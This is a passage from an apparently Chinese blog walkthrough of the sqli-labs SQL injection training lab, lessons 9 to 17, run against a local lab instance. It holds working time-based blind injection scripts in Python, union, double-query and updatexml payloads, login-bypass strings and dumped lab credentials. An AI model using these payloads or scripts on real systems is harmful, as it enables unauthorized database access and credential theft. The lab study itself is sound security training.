&quot;个列的长度为&quot; + str(j))</span><br><span class="line">                    for b in range(j + 1):</span><br><span class="line">                        for k in range(32, 127):  # 对每一个表的名字进行爆破</span><br><span class="line">                            payload = &quot;1&#x27; and if((select ascii(substr(column_name,%d,1)) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit %d,1)=%d,sleep(1.5),1)--+&quot; % (</span><br><span class="line">                            b, a, k)</span><br><span class="line">                            t = time.time()</span><br><span class="line">                            response = requests.get(url + payload)</span><br><span class="line">                            if time.time() - t &gt; 1.4:</span><br><span class="line">                                column_name += chr(k)</span><br><span class="line">                                print(column_name)</span><br><span class="line"># 现在我们有了三个表id,username,password,可以爆破出信息了</span><br><span class="line">username = &#x27;&#x27;</span><br><span class="line">for i in range(3):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的用户名</span><br><span class="line">            payload = &quot;1&#x27; and if((select ascii(substr(username,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)--+&quot; % (j, i, k)</span><br><span class="line">            t=time.time()</span><br><span class="line">            response = requests.get(url + payload)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                username += chr(k)</span><br><span class="line">                print(username)</span><br><span class="line">    username += &#x27;,&#x27;</span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">for i in range(3):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的密码</span><br><span class="line">            payload = &quot;1&#x27; and if((select ascii(substr(password,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)--+&quot; % (j, i, k)</span><br><span class="line">            t=time.time()</span><br><span class="line">            response = requests.get(url + payload)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                password += chr(k)</span><br><span class="line">                print(password)</span><br><span class="line">    password += &#x27;,&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-10-GET-双引号字符型时间盲注"><a href="#Less-10-GET-双引号字符型时间盲注" class="headerlink" title="Less-10 GET-双引号字符型时间盲注"></a>Less-10 GET-双引号字符型时间盲注</h2><p>对比第9题的代码，发现只是<code>&#39;</code>改成<code>&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">//第九题</span><br><span class="line">$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">//第十题</span><br></pre></td></tr></table></figure>

<p>代码也把</p>
<p><code>1&#39; and</code>改成<code>1&quot; and</code>就可以了</p>
<h2 id="Less-11-POST-基于报错的单引号字符型注入"><a href="#Less-11-POST-基于报错的单引号字符型注入" class="headerlink" title="Less-11 POST-基于报错的单引号字符型注入"></a>Less-11 POST-基于报错的单引号字符型注入</h2><p>前面十题都是get，然后这题是post的。</p>
<p>关键代码在这里，读入之后未做任何的处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>直接使用万能密码，闭合这个语句</p>
<p>先在数据库里进行尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE username=&#x27;admin&#x27; or 1=1 #&#x27; and password=&#x27; &#x27; LIMIT 0,1&quot;;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------+------------+</span><br><span class="line">| username | password   |</span><br><span class="line">+----------+------------+</span><br><span class="line">| Dumb     | Dumb       |</span><br><span class="line">| Angelina | I-kill-you |</span><br><span class="line">| Dummy    | p@ssword   |</span><br><span class="line">| secure   | crappy     |</span><br><span class="line">| stupid   | stupidity  |</span><br><span class="line">| superman | genious    |</span><br><span class="line">| batman   | mob!le     |</span><br><span class="line">| admin    | admin      |</span><br><span class="line">| admin1   | admin1     |</span><br><span class="line">| admin2   | admin2     |</span><br><span class="line">| admin3   | admin3     |</span><br><span class="line">| dhakkan  | dumbo      |</span><br><span class="line">| admin4   | admin4     |</span><br><span class="line">+----------+------------+</span><br></pre></td></tr></table></figure>

<p>发现可以闭合回显。所以直接在网页的用户名输入<code>admin&#39; or 1=1 #</code>即可，密码随意。</p>
<p>同样我们可以利用这个登录框进行数据库的获取。</p>
<p>由于一次只能回显两个字段，所以我们先获取数据库的名字，和get方式差不多。</p>
<p> <code>uname=1&#39; union select database(),user()#&amp;passwd=1</code> 获取数据库名</p>
<p><code>uname=1&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;security&#39;#&amp;passwd=1</code>可以将所有表名回显在第一个字段。</p>
<p>回显了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:2</span><br></pre></td></tr></table></figure>

<p><code>uname=1&#39; union select group_concat(column_name),2 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#&amp;passwd=1</code> 取列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:2</span><br></pre></td></tr></table></figure>

<p><code>uname=1&#39; union select group_concat(username),group_concat(password) from users#&amp;passwd=1</code> 最后取字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<h2 id="Less-12-POST-基于报错的双引号型字符变形注入"><a href="#Less-12-POST-基于报错的双引号型字符变形注入" class="headerlink" title="Less-12 POST-基于报错的双引号型字符变形注入"></a>Less-12 POST-基于报错的双引号型字符变形注入</h2><p>同样和get的方式是类似的</p>
<p>直接看源码，同样是进行了双引号的处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>我们依然先在数据库中测试，利用<code>admin&quot;) or 1=1#</code>来闭合</p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE username=(&quot;admin&quot;) or 1=1#&quot;) and password=(&quot;1&quot;) LIMIT 0,1;</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------+------------+</span><br><span class="line">| username | password   |</span><br><span class="line">+----------+------------+</span><br><span class="line">| Dumb     | Dumb       |</span><br><span class="line">| Angelina | I-kill-you |</span><br><span class="line">| Dummy    | p@ssword   |</span><br><span class="line">| secure   | crappy     |</span><br><span class="line">| stupid   | stupidity  |</span><br><span class="line">| superman | genious    |</span><br><span class="line">| batman   | mob!le     |</span><br><span class="line">| admin    | admin      |</span><br><span class="line">| admin1   | admin1     |</span><br><span class="line">| admin2   | admin2     |</span><br><span class="line">| admin3   | admin3     |</span><br><span class="line">| dhakkan  | dumbo      |</span><br><span class="line">| admin4   | admin4     |</span><br><span class="line">+----------+------------+</span><br></pre></td></tr></table></figure>

<p>因此我们也构造post数据<code>uname=1&quot;) or 1=1#&amp;passwd=1</code> 实现万能账号的注入</p>
<p><code>uname=1&quot;) union select database(),user()#&amp;passwd=1</code> 获取数据库名</p>
<p><code>uname=1&quot;) union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;security&#39;#&amp;passwd=1</code>，回显表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:2</span><br></pre></td></tr></table></figure>

<p><code>uname=1&quot;) union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;users&#39; and table_schema=&quot;security&quot;#&amp;passwd=1</code> 取列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:2</span><br></pre></td></tr></table></figure>

<p><code>uname=1&quot;) union select group_concat(username),group_concat(password) from users#&amp;passwd=1</code> 取字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<h2 id="Less-13-POST-双注入-单引号字符型变形注入"><a href="#Less-13-POST-双注入-单引号字符型变形注入" class="headerlink" title="Less-13 POST-双注入-单引号字符型变形注入"></a>Less-13 POST-双注入-单引号字符型变形注入</h2><p>与get的双注是一个思路的</p>
<p>先用<code>admin&#39;) or 1=1#</code>注入发现没有回显</p>
<p>然后利用二次注入获取数据库名</p>
<p><code>uname=1&#39;) union all select count(*),0x7e,concat(&#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a--+&amp;passwd=1</code></p>
<p> 回显<code>Duplicate entry &#39;~security~1&#39; for key &#39;&#39;</code></p>
<p>得到了数据库名，然后再获取表名</p>
<p><code>uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.tables group by a#&amp;passwd=1</code></p>
<p>得到表users</p>
<p><code>Duplicate entry &#39;~emails,referers,uagents,users~1&#39; for key &#39;&#39;</code></p>
<p>再获取列名</p>
<p><code>uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1</code></p>
<p>得到三个列</p>
<p><code>Duplicate entry &#39;~id,username,password~1&#39; for key &#39;&#39;</code></p>
<p>最后求列的值</p>
<p><code>uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select concat(username,&#39;-&#39;,password) from users limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1</code></p>
<p>可以靠修改limit后面的数字来取不同用户的用户名和密码</p>
<p>回显<code>Duplicate entry &#39;~Dumb-Dumb~1&#39; for key &#39;&#39;</code></p>
<h2 id="Less-14-POST-双注入-双引号字符型变形注入"><a href="#Less-14-POST-双注入-双引号字符型变形注入" class="headerlink" title="Less-14 POST-双注入-双引号字符型变形注入"></a>Less-14 POST-双注入-双引号字符型变形注入</h2><p>看14与13的源码有一些不同，在于双引号的注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;</span><br><span class="line">$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; </span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>14题采用了双引号</p>
<p><code>uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a#&amp;passwd=1</code></p>
<p>取数据库名</p>
<p><code>Duplicate entry &#39;~security~1&#39; for key &#39;&#39;</code></p>
<p>同样取表名</p>
<p><code>uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.tables group by a#&amp;passwd=1</code></p>
<p>回显</p>
<p><code>Duplicate entry &#39;~emails,referers,uagents,users~1&#39; for key &#39;&#39;</code></p>
<p>取列</p>
<p><code>uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1</code></p>
<p>回显</p>
<p><code>Duplicate entry &#39;~id,username,password~1&#39; for key &#39;&#39;</code></p>
<p>最后取每个字段</p>
<p><code>uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select concat(username,&#39;:&#39;,password) from users limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1</code></p>
<p>同样可以改limit后面数字得到不同的结果</p>
<p> <code>Duplicate entry &#39;~Dumb:Dumb~1&#39; for key &#39;&#39;</code></p>
<h2 id="Less-15-POST-基于布尔-时间延迟单引号型盲注"><a href="#Less-15-POST-基于布尔-时间延迟单引号型盲注" class="headerlink" title="Less-15 POST-基于布尔/时间延迟单引号型盲注"></a>Less-15 POST-基于布尔/时间延迟单引号型盲注</h2><p>此处的思路与get型是类似的，只需要改一下get为post</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-15/&quot;</span><br><span class="line"></span><br><span class="line">database_name = &#x27;&#x27;</span><br><span class="line">for database_length in range(1, 10):</span><br><span class="line">    data=&#123;&#x27;uname&#x27;:&quot;admin&#x27; and if(length(database())=&quot; + str(database_length) + &quot;,sleep(1.5),1)#&quot;,&#x27;passwd&#x27;:&quot;1&quot;&#125;</span><br><span class="line">    t = time.time()  # 开始前时间</span><br><span class="line">    response = requests.post(url,data)</span><br><span class="line">    if time.time() - t &gt; 1.4:  # 得出数据库长度</span><br><span class="line">        for i in range(database_length + 1):  # 按位遍历，+1是为了之后引用在payload里面可以避免丢失一位。</span><br><span class="line">            for j in range(32, 127):  # 遍历表的ascii码</span><br><span class="line">                data=&#123;&#x27;uname&#x27;:&quot;admin&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(1.5),1)#&quot; % (i, j),&#x27;passwd&#x27;:&quot;1&quot;&#125;</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.post(url,data)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    database_name += chr(j)</span><br><span class="line">                    print(database_name)</span><br><span class="line">print(&quot;数据库是&quot; + database_name)</span><br><span class="line"></span><br><span class="line">for tables in range(1, 10):</span><br><span class="line">    data = &#123;&#x27;uname&#x27;: &quot;admin&#x27; and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(1.5),1)#&quot; % tables, &#x27;passwd&#x27;: &quot;1&quot;&#125;</span><br><span class="line">    t=time.time()</span><br><span class="line">    response = requests.post(url, data)</span><br><span class="line">    if time.time() - t &gt; 1.4:</span><br><span class="line">        print(tables)</span><br><span class="line">        for i in range(tables):  # 划分不同的表进行遍历</span><br><span class="line">            table_name = &#x27;&#x27;</span><br><span class="line">            for j in range(1, 10):</span><br><span class="line">                data = &#123;</span><br><span class="line">                    &#x27;uname&#x27;: &quot;admin&#x27; and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                    i, j), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.post(url, data)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    print(&quot;第&quot; + str(i + 1) + &quot;个表的长度的为&quot; + str(j))  # 先找出每个表长度</span><br><span class="line">                    for a in range(j + 1):  # 找出每个表的每个名字</span><br><span class="line">                        for k in range(32, 127):</span><br><span class="line">                            data = &#123;</span><br><span class="line">                                &#x27;uname&#x27;: &quot;admin&#x27; and if((select ascii(substr(table_name,%d,1)) from information_schema.tables where &quot; \</span><br><span class="line">                                         &quot;table_schema=database() limit %d,1)=%d,sleep(1.5),1)#&quot; % (a, i, k),</span><br><span class="line">                                &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">                            t = time.time()</span><br><span class="line">                            response = requests.post(url, data)</span><br><span class="line">                            if time.time() - t &gt; 1.4:</span><br><span class="line">                                table_name += chr(k)</span><br><span class="line">                                print(table_name)</span><br><span class="line">                                # 到这里我们就可以得到数据库名字和表的名字了，然后就可以根据名字直接找列</span><br><span class="line">for i in range(1, 10):  # 找到列数</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;uname&#x27;: &quot;admin&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">            i), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">    t = time.time()</span><br><span class="line">    response = requests.post(url, data)</span><br><span class="line">    if time.time() - t &gt; 1.4:</span><br><span class="line">        print(&quot;表的列数的为&quot; + str(i))  # 得到有三个表</span><br><span class="line">        for a in range(i + 1):</span><br><span class="line">            column_name = &#x27;&#x27;</span><br><span class="line">            for j in range(1, 10):  # 得到每个表表长</span><br><span class="line">                payload = &quot;admin&#x27; and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                    a, j)</span><br><span class="line">                t = time.time()</span><br><span class="line">                response = requests.get(url + payload)</span><br><span class="line">                if time.time() - t &gt; 1.4:</span><br><span class="line">                    print(&quot;第&quot; + str(a + 1) + &quot;个列的长度为&quot; + str(j))</span><br><span class="line">                    for b in range(j + 1):</span><br><span class="line">                        for k in range(32, 127):  # 对每一个表的名字进行爆破</span><br><span class="line">                            data = &#123;</span><br><span class="line">                                &#x27;uname&#x27;: &quot;admin&#x27; and if((select ascii(substr(column_name,%d,1)) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                                    b, a, k), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">                            t = time.time()</span><br><span class="line">                            response = requests.post(url, data)</span><br><span class="line">                            if time.time() - t &gt; 1.4:</span><br><span class="line">                                column_name += chr(k)</span><br><span class="line">                                print(column_name)</span><br><span class="line"># 现在我们有了三个表id,username,password,可以爆破出信息了</span><br><span class="line">username = &#x27;&#x27;</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的用户名</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;uname&#x27;: &quot;admin&#x27; and if((select ascii(substr(username,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                j, i, k), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                username += chr(k)</span><br><span class="line">                print(username)</span><br><span class="line">    username += &#x27;,&#x27;</span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的密码</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;uname&#x27;: &quot;admin&#x27; and if((select ascii(substr(password,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                j, i, k), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                password += chr(k)</span><br><span class="line">                print(password)</span><br><span class="line">    password += &#x27;,&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Less-16-POST-基于布尔-时间延迟双引号型盲注"><a href="#Less-16-POST-基于布尔-时间延迟双引号型盲注" class="headerlink" title="Less-16 POST-基于布尔/时间延迟双引号型盲注"></a>Less-16 POST-基于布尔/时间延迟双引号型盲注</h2><p>和15一样的思路，把单引号改双引号</p>
<p>admin’变为admin”)</p>
<p>代码就直接找用户名和密码吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-16/&quot;</span><br><span class="line"></span><br><span class="line">username = &#x27;&#x27;</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的用户名</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;uname&#x27;: &quot;admin\&quot;) and if((select ascii(substr(username,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                    j, i, k), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                username += chr(k)</span><br><span class="line">                print(username)</span><br><span class="line">    username += &#x27;,&#x27;</span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        for k in range(32, 127):  # 得到所有的密码</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;uname&#x27;: &quot;admin\&quot;) and if((select ascii(substr(password,%d,1)) from users limit %d,1)=%d,sleep(1.5),1)#&quot; % (</span><br><span class="line">                    j, i, k), &#x27;passwd&#x27;: &#x27;1&#x27;&#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            if time.time() - t &gt; 1.4:</span><br><span class="line">                password += chr(k)</span><br><span class="line">                print(password)</span><br><span class="line">    password += &#x27;,&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="Less-17-POST-基于错误的更新查询"><a href="#Less-17-POST-基于错误的更新查询" class="headerlink" title="Less-17 POST-基于错误的更新查询"></a>Less-17 POST-基于错误的更新查询</h2><p>（做该题可能误删数据库）</p>
<p>先查看源码发现存在着update，因此可以采用更新查询注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span><br><span class="line">		$row1 = $row[&#x27;username&#x27;];  	</span><br><span class="line">		//echo &#x27;Your Login name:&#x27;. $row1;</span><br><span class="line">		$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;;</span><br><span class="line">		mysql_query($update);</span><br></pre></td></tr></table></figure>

<p>由于在uname处有了太多过滤。在源码中将其读入<code>check_input</code>利用<code>mysql_real_escape_string()</code>函数实现字符串的转义。因此要在passwd进行注入。</p>
<p>先了解一下要用的<code>updatexml()</code>函数</p>
<p><code>UPDATEXML (XML_document, XPath_string, new_value);</code></p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>我们可以构造<code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code>，因为concat是把所有的字段连成字符串，不符合XPath_string格式，因此会报错。</p>
<p>post提交<code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#</code>可以测试得到</p>
<p><code>XPATH syntax error: &#39;~5.7.26~&#39;</code></p>
<p>同样先取表名</p>
<p><code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</code></p>
<p>回显</p>
<p><code>XPATH syntax error: &#39;~security~&#39;</code></p>
<p>取表名</p>
<p><code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#</code></p>
<p>回显</p>
<p><code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
<p>取列</p>
<p><code>uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)#</code></p>
<p>回显</p>
